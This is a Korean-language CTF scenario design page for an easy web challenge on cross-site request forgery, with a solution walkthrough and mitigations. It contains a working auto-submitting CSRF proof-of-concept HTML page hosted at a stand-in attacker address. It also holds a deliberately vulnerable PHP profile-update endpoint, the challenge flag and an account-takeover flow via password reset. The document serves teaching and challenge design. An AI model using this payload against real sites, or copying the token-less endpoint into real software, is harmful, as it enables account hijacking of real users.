---
title: Cross-Site Request Forgery (CSRF) — Web CTF Scenario
created: 2026-06-15
updated: 2026-06-15
type: ctf-scenario
tags: [ctf, web, csrf, client-side, easy]
confidence: high
---

# Cross-Site Request Forgery (CSRF) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Profile Updater (간이 이메일 관리 시스템)
- **난이도**: Easy (초급)
- **핵심 컨셉**: 피해자의 세션 권한을 도용하여 본인 동의 없이 웹 애플리케이션의 중요 설정을 변경시키는 **사이트 간 요청 위조 (Cross-Site Request Forgery - CSRF)** 취약점 문제입니다.
- 대상 서비스는 로그인된 사용자의 이메일 주소를 변경해 주는 API 엔드포인트를 운영하고 있습니다. 그러나 이 기능은 사용자가 진짜 직접 해당 화면을 활성화해 수정한 것인지, 아니면 타 사이트를 돌아다니다가 악성 링크를 실행당해 변경당한 것인지를 판단하기 위한 고유 보안 난수 토큰(CSRF Token)이 구현되어 있지 않습니다. 공격자는 자동으로 프로필 수정 POST 요청을 날리는 유도 웹사이트를 개설한 뒤, 이미 서비스에 로그인되어 있는 다른 피해자(가령 최고 어드민 봇)가 해당 사이트에 접근하도록 꼬드깁니다. 피해자의 브라우저가 자동으로 이메일 변경 요청을 전송하게 만들어 계정을 무단 변조할 수 있습니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Email Update Endpoint (`/update_profile.php`)**:
  - POST 방식으로 `email` 파라미터를 수신하여 세션 로그인 계정의 이메일 컬럼을 변경.
- **CSRF Exploit Server (Attacker's Page)**:
  - 공격자가 CTF 인프라 외부 또는 임의 영역에 업로드해 놓은 가짜 HTML.
  - 피해자가 로드하는 순간, 강제로 `/update_profile.php`로 이메일을 변경하는 POST Form을 자동 Submit(`onload`)하도록 스크립팅됨.
- **Admin Bot (Victim)**:
  - 사이트에 인증 세션 쿠키를 갖고 로그인되어 있는 상태에서, 공격자가 주입한 CSRF PoC 페이지 링크를 순차적으로 크롤링/조회해 주는 관리자 자동 봇.
- **Flag 위치**:
  - 이메일 변경 완료 후, 비밀번호 찾기(Reset) 기능을 관리자 이메일 주소로 연동 호출했을 때 수신되는 시스템 로그 정보.

### 2.2 취약점 지점
1. **Missing CSRF Anti-Forgery Token**:
  - `/update_profile.php` 에선 단순히 사용자 세션의 존재 여부만 검증합니다:
    `$user = $_SESSION['user'];`
  - 요청 주체 유효성을 확인하기 위한 일회성 무작위 대조 값(CSRF Token)이 헤더나 바디 데이터에 포함되지 않고 전적으로 세션 쿠키의 자동 전송 특성에만 편입되어 실행됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 타입 | 취약 함수 및 태그 |
|------------|--------|------|----------|-------------|-------------------|
| `/update_profile.php` | POST | 필요 (쿠키 인증) | `email` | Form / Text | CSRF 검증 로직 누락 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 프로필 수정 기능 전송 폼 확인
1. 가입한 일반 회원 계정으로 접속하여 이메일 정보 변경 폼을 작동시킵니다.
2. 전송되는 리퀘스트 양식을 브라우저 개발자 도구의 Network 패널에서 상세 모니터링합니다:
   - 전송 방식: POST
   - 전송 타겟: `/update_profile.php`
   - 본문 내용: `email=attacker@mail.com`
3. 요청 본문이나 HTTP 헤더에 해시 형태의 보안 토큰(예: `csrf_token`) 필드가 완전 누락되어 있음을 포착합니다.

### Step 2. CSRF 악성 Exploit PoC 설계
1. 피해자의 브라우저 세션을 이용해 강제로 이메일 변경 API를 호출할 악성 HTML 코드를 작성합니다.
   ```html
   <!-- csrf_poc.html (공격자가 호스팅하는 유도 문서) -->
   <html>
     <body>
       <form id="csrfForm" action="http://target.local/update_profile.php" method="POST">
         <input type="hidden" name="email" value="attacker@ctf-mail.com" />
       </form>
       <script>
         // 페이지가 열리자마자 자동으로 폼 전송을 작동시킴
         document.getElementById('csrfForm').submit();
       </script>
     </body>
   </html>
   ```

### Step 3. 피해자(관리자 봇) 방문 유도
1. 작성한 PoC 코드 파일을 공격자의 임의 웹 공간에 올려 활성 주소를 땁니다. (예: `http://attacker.local/csrf_poc.html`)
2. 웹 CTF의 '관리자에게 링크 건의하기' 혹은 '문의하기봇' 인터페이스를 사용해 해당 악성 링크를 제출합니다.

### Step 4. flag 획득
1. 관리자 봇이 악성 페이지에 도달하면 봇의 로그인 쿠키가 자동으로 웹 서버 경로로 포워딩되어 이메일 변경 요청이 승인 처리됩니다.
2. 관리자의 이메일이 공격자 소유의 `attacker@ctf-mail.com`으로 바뀐 직후, 패스워드 재설정 기능을 연동하여 변경 링크를 공격자 사설 메일함 또는 메일 발송 로그를 통해 받아옵니다.
3. 관리자 계정에 로그인하여 최종 플래그(`FLAG{csrf_basic_cookie_session_hijack_success}`)를 취득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
<!-- update_profile.php (취약한 CSRF PHP 예시) -->
<?php
session_start();

// 로그인 인증 확인
if (!isset($_SESSION['user_id'])) {
    die("Authentication required.");
}

// 이메일 파라미터 획득
if (isset($_POST['email'])) {
    $new_email = $_POST['email'];
    $user_id = $_SESSION['user_id'];

    // 데이터베이스 연동
    $conn = new mysqli("localhost", "dbuser", "dbpass", "ctf_db");

    // 취약점 지점: 사용자의 정보를 변경하는 '상태 변화 작업'을 진행하면서 
    // 리퀘스트에 올바른 CSRF 토큰(난수 해시 값)이 동반되었는지 비교하는 
    // 검증 구문이 없음. 브라우저가 피해자 권한의 세션 쿠키를 자동으로 
    // 전송해 주는 특성만을 신뢰함.
    $stmt = $conn->prepare("UPDATE users SET email = ? WHERE id = ?");
    $stmt->bind_param("si", $new_email, $user_id);
    
    if ($stmt->execute()) {
        echo "Profile email updated successfully!";
    } else {
        echo "Database transaction failed.";
    }
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **난수 기반 CSRF 토큰 검증 메커니즘 구축**:
   - 세션 기동 시 유출 및 예측이 불가능한 고유 암호학적 난수 해시(CSRF Token)를 서버 세션 영역에 최초 바인딩합니다.
   - 데이터 변경이 따르는 모든 POST/PUT/DELETE 입력 양식(Form) 및 AJAX 호출 시 이 토큰을 숨겨진 폼 필드(`<input type="hidden" name="csrf_token">`)나 커스텀 HTTP 헤더에 담아 전송하게 강제하고, 백엔드 진입 미들웨어 단계에서 세션에 기재된 원본 토큰 값과 1:1 비교를 강제하여 공격을 완전 차단합니다.
2. **세션 쿠키에 SameSite 속성 기본 선언**:
   - 인증 쿠키 발급 시 SameSite 헤더 명세에 `Lax` 혹은 `Strict` 옵션을 주입합니다.
     `Set-Cookie: PHPSESSID=xyz123; SameSite=Lax; Secure`
   - 이를 선언하면 제3의 사이트(Cross-Site)에서 타겟 사이트로 비자발적으로 유발되는 도메인 요청(CSRF) 상황에 대해서는 쿠키 전달이 브라우저 정책 레벨에서 전면 불허 처리됩니다.
3. **요청 검증 및 리인증 추가**:
   - 민감한 개인 정보(이메일, 연락처, 비밀번호 등)의 직접적인 상태 변화가 진행되는 엔드포인트는 반드시 이전 화면으로 유입을 증명하는 `Referer` / `Origin` 출처를 엄격히 매칭 검증하거나, 행동 완료 전에 기존 로그인 비밀번호를 재입력하게 통제(Re-authentication)하는 정책을 결합 수립합니다.
